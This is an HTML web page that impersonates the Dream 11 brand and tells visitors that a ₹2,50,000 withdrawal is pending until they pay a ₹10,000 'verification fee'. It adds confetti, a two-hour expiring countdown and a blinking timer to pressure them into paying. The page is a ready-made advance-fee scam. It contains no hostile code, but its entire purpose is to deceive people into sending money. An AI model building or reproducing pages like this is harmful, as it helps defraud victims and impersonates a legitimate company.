<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Withdrawal Payment</title>
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #d90429; /* RED BACKGROUND */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .header {
      font-size: 40px;
      color: white;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .container {
      background-color: #ffffff;
      padding: 30px 25px;
      border-radius: 15px;
      text-align: center;
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
      max-width: 400px;
      width: 90%;
    }

    h1 {
      color: #2c3e50;
      font-size: 26px;
      margin-bottom: 15px;
    }

    p {
      font-size: 18px;
      color: #444;
      margin-bottom: 15px;
    }

    .note {
      color: #e74c3c;
      font-weight: bold;
      margin-top: 10px;
    }

    .btn {
      display: inline-block;
      background: linear-gradient(to right, #28a745, #218838);
      color: #fff;
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
      transition: transform 0.2s ease;
    }

    .btn:hover {
      transform: scale(1.05);
    }

    #countdown {
      margin-top: 15px;
      font-size: 16px;
      color: #e74c3c;
      font-weight: bold;
    }

    .blink {
      animation: blinker 1s linear infinite;
    }

    @keyframes blinker {
      50% {
        opacity: 0;
      }
    }

    .expired {
      color: red;
      font-weight: bold;
      font-size: 18px;
      margin-top: 15px;
    }
  </style>
</head>
<body>
  <div class="header">Dream 11</div>

  <div class="container">
    <h1>Withdrawal Pending</h1>
    <p>Your withdrawal of ₹2,50,000 is pending. Please complete the verification fee of ₹10,000 to proceed.</p>
    <p class="note">Note: You must pay ₹10,000 as Dream11 commission before your withdrawal can be processed.</p>
    <a id="payBtn" class="btn" href="#" target="_blank">Pay Now</a>
    <div id="countdown"></div>
    <div id="expiredMessage" class="expired" style="display:none;">Link Expired</div>
  </div>

  <script>
    // Confetti on load
    window.onload = () => {
      confetti({
        particleCount: 150,
        spread: 70,
        origin: { y: 0.6 },
      });
    };

    // Countdown logic
    const countdownDuration = 2 * 60 * 60 * 1000;
    let endTime = localStorage.getItem('withdrawalEndTime');

    if (!endTime) {
      endTime = Date.now() + countdownDuration;
      localStorage.setItem('withdrawalEndTime', endTime);
    } else {
      endTime = parseInt(endTime);
    }

    function updateCountdown() {
      const now = Date.now();
      const distance = endTime - now;

      if (distance <= 0) {
        clearInterval(timer);
        document.getElementById('payBtn').style.display = 'none';
        document.getElementById('countdown').style.display = 'none';
        document.getElementById('expiredMessage').style.display = 'block';
        localStorage.removeItem('withdrawalEndTime');
        return;
      }

      const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
      const minutes = Math.floor((distance / (1000 * 60)) % 60);
      const seconds = Math.floor((distance / 1000) % 60);

      const countdownText = `Link expires in ${hours}h ${minutes}m ${seconds}s`;
      const countdownElement = document.getElementById('countdown');
      countdownElement.innerHTML = countdownText;

      if (distance <= 5 * 60 * 1000) {
        countdownElement.classList.add('blink');
      }
    }

    updateCountdown();
    const timer = setInterval(updateCountdown, 1000);
  </script>
</body>
</html>
